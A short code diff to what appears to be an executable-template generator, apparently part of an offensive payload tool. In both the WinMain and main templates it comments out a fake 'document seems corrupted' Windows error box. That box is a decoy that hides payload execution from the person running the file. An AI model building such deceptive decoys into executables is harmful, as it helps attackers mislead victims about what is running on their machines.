@@ -165,7 +165,7 @@ TEMPLATE_C_CODE = """
 TEMPLATE_WIN32_CODE = """
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-
+/*
   MessageBoxA(NULL,
   "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
   "If this happened for the first time, try re-opening the document."
@@ -173,7 +173,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   ,
   "Windows Error",
   MB_ICONERROR | MB_OK);
-
+*/
 """ + TEMPLATE_C_CODE + """
 
   return retcode;
@@ -183,7 +183,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 TEMPLATE_EXE_CODE = """
 int main(int argc, char** argv, char** envp)
 {
-
+/*
   MessageBoxA(NULL,
   "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
   "If this happened for the first time, try re-opening the document."
@@ -191,7 +191,7 @@ int main(int argc, char** argv, char** envp)
   ,
   "Windows Error",
   MB_ICONERROR | MB_OK);
-
+*/
 """ + TEMPLATE_C_CODE + """
 
   return retcode;
